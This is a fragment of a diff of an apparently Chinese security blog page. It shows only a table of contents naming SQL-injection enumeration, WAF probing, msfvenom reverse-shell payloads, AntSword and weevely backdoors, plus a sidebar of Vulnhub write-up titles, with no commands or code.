toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom__u53CD_u5F39shell"><span class="toc-text">Msfvenom 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PayLoads_List"><span class="toc-text">PayLoads List</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Binaries_Payloads"><span class="toc-text">Binaries Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web_Payloads"><span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scripting_Payloads"><span class="toc-text">Scripting Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ShellCode_Payloads"><span class="toc-text">ShellCode Payloads</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76D1_u542C-getshell"><span class="toc-text">监听-getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
     </article>
   
   
@@ -832,23 +879,23 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-30</div>
+        <a href="/338e3c98.html"><div class="recent-posts-item-content">Vulnhub|Flink集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-30</div>
+        <a href="/386f84ef.html"><div class="recent-posts-item-content">Vulnhub|Tomcat集合</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-29</div>
         <a href="/480ec251.html"><div class="recent-posts-item-content">Vulnhub|DarkHole1</div></a>
       </div>
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-23</div>
-        <a href="/be97aa85.html"><div class="recent-posts-item-content">概念题目</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-23</div>
-        <a href="/e2181504.html"><div class="recent-posts-item-content">提权</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-12-23</div>
-        <a href="/e0b816a7.html"><div class="recent-posts-item-content">“差异”题</div></a>
+        <a href="/3a00fd33.html"><div class="recent-posts-item-content">Vulnhub|Sumo</div></a>
       </div>
     
   </div>
